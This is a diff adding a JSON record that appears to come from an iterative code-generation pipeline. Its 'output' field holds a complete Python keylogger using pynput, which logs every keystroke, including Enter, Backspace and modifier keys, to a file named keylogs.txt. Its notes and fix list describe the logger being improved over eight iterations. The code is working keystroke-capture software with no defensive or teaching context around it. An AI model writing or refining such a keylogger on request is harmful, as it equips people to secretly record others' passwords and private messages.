@@ -1,0 +1,9 @@
+{
+  "output": "import pynput\nfrom pynput import keyboard\ndef on_press(key):\n    try:\n        k = key.char\n    except AttributeError:\n        if key == keyboard.Key.enter:\n            k = '[ENTER]'\n        elif key == keyboard.Key.backspace:\n            k = '[BACKSPACE]'\n        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:\n            k = '[SHIFT]'\n        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:\n            k = '[CTRL]'\n        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:\n            k = '[ALT]'\n        elif key == keyboard.Key.tab:\n            k = '[TAB]'\n        elif key == keyboard.Key.space:\n            k = ' '\n        else:\n            k = f'[{key.name.upper()}]'\n    try:\n        with open('keylogs.txt', 'a') as log_file:\n            log_file.write(k)\n    except Exception as e:\n        print(f'Error writing to file: {e}')\n    print(f'Key pressed: {k}')\ndef on_release(key):\n    if key == keyboard.Key.esc:\n        return False\nwith keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n    listener.join()",
+  "notes": "Added error handling for file writing and expanded special key coverage.",
+  "applied_fixes": [
+    "iteration7_issue1",
+    "iteration7_issue2"
+  ],
+  "iterations": 8
+}
